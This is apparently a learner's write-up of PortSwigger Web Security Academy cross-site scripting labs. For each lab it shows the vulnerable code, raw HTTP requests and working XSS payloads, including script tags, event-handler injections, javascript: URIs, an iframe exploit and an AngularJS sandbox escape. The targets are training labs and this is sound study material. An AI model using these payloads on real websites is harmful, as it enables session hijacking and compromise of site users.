# XSS (Cross Site Scripting)

## Lab: Reflected XSS into HTML context with nothing encoded

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function. 

When first searching for the XSS I immedietely came across a search bar which is a common target due to the reflected nature of the users search term. After confirming my search term was reflected I tried a generic `<script>alert(1)</script>` which produced the required alert.

```
GET /?search=test HTTP/1.1
Host: 0a58002404a6303cc0621de20057005b.web-security-academy.net
...


```

```
...
<section class=blog-header>
     <h1>0 search results for 'test'</h1>
     <hr>
</section>
...

```


```
GET /?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: 0a58002404a6303cc0621de20057005b.web-security-academy.net
...
```


```
<section class=blog-header>
        <h1>0 search results for '<script>alert(1)</script>'</h1>
    <hr>
</section>

```


## Lab: Stored XSS into HTML context with nothing encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 

I used the below request to exploit the xss.

```

POST /post/comment HTTP/1.1
Host: 0a9900f6042ec02cc105d020007f00e5.web-security-academy.net
Cookie: session=OxXDegoxz9yhuzrLL3VJxpr2XoHZlO2z
Content-Length: 161
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a9900f6042ec02cc105d020007f00e5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9900f6042ec02cc105d020007f00e5.web-security-academy.net/post?postId=6
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=shcyS1qQiYDaG0DQTi00mR2ih7acLuEd&postId=6&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&name=test&email=test%40test.com&website=https%3A%2F%2Fwww.test.com

```

and the following response shows the successful attack:

```
...
<section class="comment">
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="https://www.test.com">test</a> | 18 December 2022
</p>
<p><script>alert(1)</script></p>
<p></p>
</section>
...
```

## Lab: DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 

The vulnerable code snippet is below:

```

function trackSearch(query) {
   document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}

var query = (new URLSearchParams(window.location.search)).get('search');

if(query) {
     trackSearch(query);
}

<img src="/resources/images/tracker.gif?searchTerms=">
                    
```

`window.location.search` is one of many sources that a potential attacker could use to send data to hoping that it reaches a `sink` like `document.write` to exploit dom xss.

Request:

```
GET /?search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: 0aba0083045fae7bc1c2fde3008c0087.web-security-academy.net
Cookie: session=A7lqFoeGzNhAhipBbbz3Vu7HWHrzPu9B
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"


```

## Lab: DOM XSS in innerHTML sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 

The vulnerable code snippet is below:

```


function doSearchQuery(query) {
     document.getElementById('searchMessage').innerHTML = query;
}

var query = (new URLSearchParams(window.location.search)).get('search');

if(query) {
 doSearchQuery(query);
}
                        

```

In this exercise you can't use the generic script payload as in the mozilla documentation on `innerHTML` it states `Although this may look like a cross-site scripting attack, the result is harmless. HTML specifies that a <script> tag inserted with innerHTML should not execute`

However there are multiple ways to execute JavaScript for example, two which will execute:

- `<svg/onload=alert(1)>`
- `<img src='x' onerror=alert(1)>`


## Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the "back" link alert document.cookie. 

The issue is in the following code:

```
<script>
   $(function() {
     $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
  });
</script>

```

In this exercise you just need to change the following link:

`https://0a14006b03734a26c119cc24009100fa.web-security-academy.net/feedback?returnPath=/post`

to:

`https://0a14006b03734a26c119cc24009100fa.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)`


## Lab: DOM XSS in jQuery selector sink using a hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. 


```
$(window).on('hashchange', function() {
     var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
     if (post) post.get(0).scrollIntoView();
});
```

The vulnerability is located in the above code snippet and to exploit it you can utilise the exploit-server to load an iframe of the victim website like below:

`<iframe src="https://0af3004103f96251c236991f005700f9.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

## Lab: Reflected XSS into attribute with angle brackets HTML-encoded

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. 

While the angle brackets are encoded it is still possible to pop an alert by using the following payload:

`test123" onfocus="alert(1)`

This is because this leads to legitmate syntax in the application code below:



`<input type="text" placeholder="Search the blog..." name="search" value="test123" onfocus="alert(1)">`


## Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

Based on the information provided we can be relatively and the code below we can make a guess that the vulnerability is in the below code where the `href` tag is.

```
</section>
<section class="comment">
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar">                            
<a id="author" href="https://www.test.com">testUser</a> | 20 December 2022
</p>
<p>test</p>
<p></p>
</section>
```

using the `javascript:alert(1)` payload we are able to execute JS within the href tag once the link is clicked.

## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 



```
var searchTerms = '';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    

```

You can input the following payload to break out of the searchTerms variable.

`'-alert(1)-'`.

`var searchTerms = '-alert(1)-''';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');`


## Lab: DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

The vulnerable code is below:

```

var stores = ["London","Paris","Milan"];

var store = (new URLSearchParams(window.location.search)).get('storeId');

document.write('<select name="storeId">');

if(store) {
     document.write('<option selected>'+store+'</option>');
}

for(var i=0;i<stores.length;i++) {
     if(stores[i] === store) {
          continue;
     }
     document.write('<option>'+stores[i]+'</option>');
}

document.write('</select>');
                            

```

You can see from the above Javascript that the `storeId` is taken from the url and passed in to document.write. With the written results below.

```

<select name="storeId">
     <option selected="">test123</option>
     <option>London</option>
     <option>Paris</option>
     <option>Milan</option>
</select>


```

We can break out of this using the following payload:

`</option></select><script>alert(1)</script>`


## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.

As this uses the AngularJS framework we can use the following payload to pop an alert box.

`{{constructor.constructor('alert(1)')()}}`


## Lab: Reflected DOM XSS

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the alert() function.


# References

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md